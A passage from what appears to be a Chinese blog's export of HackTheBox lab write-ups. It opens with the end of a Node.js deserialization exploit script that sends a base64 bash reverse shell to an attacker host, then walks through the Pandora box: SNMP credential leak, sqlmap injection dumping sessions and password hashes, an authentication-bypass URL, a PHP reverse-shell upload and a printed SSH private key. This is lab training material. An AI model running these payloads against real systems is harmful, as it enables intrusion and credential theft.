process.argv.slice(2, 4) const login = async () =&gt; { const res = await axios.post(`${baseUrl}/login`, { user, password }) return res.headers[&#39;set-cookie&#39;][0] } const rce = async (cookie, cmd) =&gt; { const paramIndex = cookie.indexOf(&#39;;&#39;) cookie = cookie.substring(0, paramIndex - 3) + encodeURIComponent( `,&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() { require(&#39;child_process&#39;).exec(&#39;${cmd}&#39;) }()&quot;}` ) + cookie.substring(paramIndex) await axios.get(baseUrl, { headers: { cookie } }) } const reverseShell = () =&gt; Buffer.from(`bash -i &gt;&amp; /dev/tcp/${lhost}/${lport} 0&gt;&amp;1`).toString(&#39;base64&#39;) const main = async () =&gt; { if (!lhost || !lport) { console.log(&#39;[!] Usage: node serialize-rce.js &lt;lhost&gt; &lt;lport&gt;&#39;) process.exit() } const cookie = await login() console.log(&#39;[+] Login successful&#39;) await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`) console.log(&#39;[+] RCE completed&#39;) } main()","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Pandora - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Pandora","date":"2022-01-08T11:38:36.000Z","updated":"2023-06-13T03:48:30.000Z","comments":true,"path":"2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/","link":"","permalink":"http://www.lucifiel.com/2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/","excerpt":"","text":"Hackthebox - Pandora靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.136 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 02:29 EST Nmap scan report for 10.10.11.136 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Play | Landing No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=1/17%OT=22%CT=1%CU=41376%PV=Y%DS=2%DC=T%G=Y%TM=61E51AF OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=C)SEQ OS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 256/tcp) HOP RTT ADDRESS 1 238.86 ms 10.10.14.1 2 239.01 ms 10.10.11.136 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 59.77 seconds 将DNS解析添加到hosts echo 10.10.11.136 pandora.htb &gt;&gt; /etc/hosts 然后去看一下80端口 在页面上没看到什么有用的东西，fuzz下目录看看吧 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://pandora.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://pandora.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ assets [Status: 301, Size: 311, Words: 20, Lines: 10] server-status [Status: 403, Size: 276, Words: 20, Lines: 10] [Status: 200, Size: 33560, Words: 13127, Lines: 908] :: Progress: [20116/20116] :: Job [1/1] :: 119 req/sec :: Duration: [0:03:26] :: Errors: 0 :: 也没看到什么有用的东西，有点迷惑 扫描个UDP端口看看 ┌──(root💀kali)-[~/Desktop] └─# nmap -sC -sV -sU -top-ports=20 pandora.htb 130 ⨯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 20:30 EST Nmap scan report for pandora.htb (10.10.11.136) Host is up (0.27s latency). PORT STATE SERVICE VERSION 53/udp closed domain 67/udp open|filtered dhcps 68/udp open|filtered dhcpc 69/udp closed tftp 123/udp open|filtered ntp 135/udp closed msrpc 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) | snmp-info: | enterprise: net-snmp | engineIDFormat: unknown | engineIDData: 48fa95537765c36000000000 | snmpEngineBoots: 30 |_ snmpEngineTime: 20m46s | snmp-processes: | 1: | | 2: | | 3: | |_ 4: | snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 |_ System uptime: 20m46.36s (124636 timeticks) |_snmp-win32-software: 162/udp open|filtered snmptrap 445/udp open|filtered microsoft-ds 500/udp open|filtered isakmp 514/udp open|filtered syslog 520/udp closed route 631/udp closed ipp 1434/udp open|filtered ms-sql-m 1900/udp open|filtered upnp 4500/udp open|filtered nat-t-ike 49152/udp open|filtered unknown Service Info: Host: pandora Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 135.89 seconds 这里可以看到有一个snmp开着，而且明显还有信息没有显示出来，我感觉这就是突破口 漏洞利用使用snmpwalk扫描一下pandora.htb snmpwalk -v 2c pandora.htb -c public &gt; nmap iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: &quot;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&quot; 得到了一个账号密码 username = daniel password = HotelBabylon23 去ssh登录试试 ┌──(root💀kali)-[~/Desktop] └─# ssh daniel@pandora.htb daniel@pandora.htb&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 01:47:00 UTC 2022 System load: 0.12 Processes: 263 Usage of /: 64.4% of 4.87GB Users logged in: 1 Memory usage: 12% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jan 18 01:12:05 2022 from 10.10.14.20 daniel@pandora:~$ whoami&amp;&amp;id daniel uid=1001(daniel) gid=1001(daniel) groups=1001(daniel) 成功登录 daniel@pandora:~$ cd ../ daniel@pandora:/home$ ls daniel matt daniel@pandora:/home$ cd matt daniel@pandora:/home/matt$ ls LinEnum.sh snmp-mibs-downloader snmp-mibs-downloader_1.2.tar.xz user.txt daniel@pandora:/home/matt$ cat user.txt cat: user.txt: Permission denied 这里可以看到，有一个matt账户，并且我们没有权限访问user.txt的flag文件，那就是得想办法提权到matt用户 权限提升Matt查看一下端口 daniel@pandora:/home/matt$ netstat -tuplen (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 21170 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 24732 - tcp 0 0 0.0.0.0:5577 0.0.0.0:* LISTEN 1000 119305 - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 114 24400 - tcp6 0 0 :::22 :::* LISTEN 0 24759 - tcp6 0 0 :::80 :::* LISTEN 0 24585 - udp 0 0 127.0.0.53:53 0.0.0.0:* 101 21169 - udp 0 0 0.0.0.0:161 0.0.0.0:* 0 24804 - udp6 0 0 ::1:161 :::* 0 24805 - 这里好像有本地网络服务pandora，查看一下 daniel@pandora:/home/matt$ curl pandora.htb &lt;meta HTTP-EQUIV=&quot;REFRESH&quot; content=&quot;0; url=/pandora_console/&quot;&gt; 确实存在，使用ssh把端口转发出来 ┌──(root💀kali)-[~/Desktop] └─# ssh -L 80:127.0.0.1:80 daniel@pandora.htb daniel@pandora.htb&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 01:54:11 UTC 2022 System load: 0.0 Processes: 273 Usage of /: 64.6% of 4.87GB Users logged in: 1 Memory usage: 19% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jan 18 01:47:01 2022 from 10.10.14.17 代理成功，我们去访问一下127.0.0.1 这里发现了一个关键线索v7.0NG.742_FIX_PERL2020 去搜索一下这个版本有没有漏洞 https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001 找到了一个sql注入，咱们去注入吧 ┌──(root💀kali)-[~/Desktop] └─# sqlmap -u &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot; --batch --dbms=mysql -D pandora -T tsessions_php -C id_session,data --dump +----------------------------+------------------------------------------------------+ | id_session | data | +----------------------------+------------------------------------------------------+ | 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;; | | 0ahul7feb1l9db7ffp8d25sjba | NULL | | 1um23if7s531kqf5da14kf5lvm | NULL | | 22eqdjecn219cpni093reba8ee | NULL | | 27ffs3tj8rpvrm2hd0juphhda7 | id_usuario|s:6:&quot;daniel&quot;; | | 2e25c62vc3odbppmg6pjbf9bum | NULL | | 2uibrnof5j1k45g9u15tngrlju | NULL | | 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;; | | 3me2jjab4atfa5f8106iklh4fc | NULL | | 4f51mju7kcuonuqor3876n8o02 | NULL | | 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;; | | 59qae699l0971h13qmbpqahlls | NULL | | 5fihkihbip2jioll1a8mcsmp6j | NULL | | 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;; | | 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;; | | 6ctchv9r2gg7c6arpv4cipcfol | NULL | | 81f3uet7p3esgiq02d4cjj48rc | NULL | | 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;; | | 8upeameujo9nhki3ps0fu32cgd | NULL | | 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;; | | a3a49kc938u7od6e6mlip1ej80 | NULL | | agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;; | | cbo2bdg3g7vfqgjmcuc75bq0aj | NULL | | cojb6rgubs18ipb35b3f6hf0vp | NULL | | cor29cq7l3ae4g8a423as7p422 | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | d0carbrks2lvmb90ergj7jv6po | NULL | | dsot94harh6hraanl60m698enq | NULL | | e58oalliogbu7jb1dc75dos90j | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;; | | fikt9p6i78no7aofn74rr71m85 | NULL | | fqd96rcv4ecuqs409n5qsleufi | NULL | | g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;; | | g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:{}new_chat|b:0; | | gf40pukfdinc63nm5lkroidde6 | NULL | | heasjj8c48ikjlvsf1uhonfesv | NULL | | hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;; | | idlkl6lfsk05omgp2t42b8rlq9 | id_usuario|s:6:&quot;daniel&quot;; | | j4415tiqm7kck5lkovi4qocch9 | NULL | | jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;; | | knh7p9utl2089rprmm46nku2lr | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | kp90bu1mlclbaenaljem590ik3 | NULL | | l5817gd0prg6udd5sb5bufcvap | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;; | | og8c3bqae2pts9i0l6c3s2u9aq | NULL | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;; | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;; | | qh9k9iaginhd7qqu7sda2ar27o | id_usuario|s:6:&quot;daniel&quot;; | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | | r02qbtlhv3uq49mv0f4a3s4k8v | NULL | | r097jr6k9s7k166vkvaj17na1u | NULL | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;; | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;; | | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:&quot;daniel&quot;; | | v0l5i5vhf7bsk2n3k2f90nu4bi | NULL | +----------------------------+------------------------------------------------------+ ┌──(root💀kali)-[~/Desktop] └─# sqlmap -u &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot; --batch --dbms=mysql -D pandora -T tpassword_history -C id_pass,id_user,data_end,password,data_begin --dump +---------+---------+----------+----------------------------------+------------+ | id_pass | id_user | data_end | password | data_begin | +---------+---------+----------+----------------------------------+------------+ | 1 | matt | | f655f807365b6dc602b31ab3d6d43acc | | | 2 | daniel | | 76323c174bd49ffbbdedf678f6cc89a6 | | +---------+---------+----------+----------------------------------+------------+ 首先使用如下poc进行跳过 http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO 然后直接访问http://127.0.0.1/pandora_console&#x2F;即可以admin权限进行登录 选择 Admin tools -&gt; File manager https://github.com/pentestmonkey/php-reverse-shell 使用该shell，先保存到本地然后稍微修改一下 然后upload file上传 传上去后在http://127.0.0.1/pandora_console&#x2F;images&#x2F;phpshell.php可以找到shell 本地启动一个nc监听端口，然后访问该shell ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 58582 Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 03:15:11 up 15 min, 4 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT daniel pts/0 10.10.14.17 03:00 14:23 0.03s 0.03s -bash daniel pts/1 10.10.14.20 03:01 11:35 0.26s 0.21s python3 sqlpwn.py -t localhost daniel pts/2 10.10.14.128 03:02 11.00s 0.20s 0.02s ssh -L 8000:localhost:80 daniel@pandora.htb daniel pts/4 127.0.0.1 03:14 15.00s 0.02s 0.02s -bash uid=1000(matt) gid=1000(matt) groups=1000(matt) /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id matt uid=1000(matt) gid=1000(matt) groups=1000(matt) 成功拿到matt权限的shell $ cat user.txt 083fe340ff06c9a855f56ee98eaa62fd 成功拿到user权限的flag文件 Rootmatt@pandora:/home/matt$ find / -perm -u=s 2&gt; /dev/null find / -perm -u=s 2&gt; /dev/null /usr/bin/sudo /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/umount /usr/bin/pandora_backup /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/at /usr/bin/fusermount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 检查一下可利用文件 其中&#x2F;usr&#x2F;bin&#x2F;pandora_backup可利用 matt@pandora:/home/matt$ sudo /usr/bin/pandora_backup sudo /usr/bin/pandora_backup sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted sudo: unable to initialize policy plugin 直接利用会错误，我们需要一个更加稳定的shell 由于我们没有matt的密码，所以无法直接用ssh登录，也没找到ssh的秘钥，所以我们自己生成一个 matt@pandora:/home/matt$ ssh-keygen ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/matt/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/matt/.ssh/id_rsa Your public key has been saved in /home/matt/.ssh/id_rsa.pub The key fingerprint is: SHA256:SDMstiuKB3DRqypXDzX385OV0v8MrIh+lQE0alNduQ4 matt@pandora The key&#39;s randomart image is: +---[RSA 3072]----+ | . .+. ... | | . .. o... . | | .o.= + . . | |. ...+o=.. E . | |.. ....oS. * . | |. . o. o +.= | | o...o + +o. | |+.o. . ...+. o.| |+o .o.. .. +| +----[SHA256]-----+ matt@pandora:/home/matt$ cd .ssh cd .ssh matt@pandora:/home/matt/.ssh$ ls ls id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys cat id_rsa &gt; authorized_keys matt@pandora:/home/matt/.ssh$ chmod 700 authorized_keys chmod 600 authorized_keys matt@pandora:/home/matt/.ssh$ cat id_rsa cat authorized_keys -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- ┌──(root💀kali)-[~/Desktop] └─# vim id_rsa ┌──(root💀kali)-[~/Desktop] └─# chmod 700 id_rsa ┌──(root💀kali)-[~/Desktop] └─# cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 然后使用ssh进行登录 ┌──(root💀kali)-[~/Desktop] └─# ssh matt@pandora.htb -i id_rsa Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 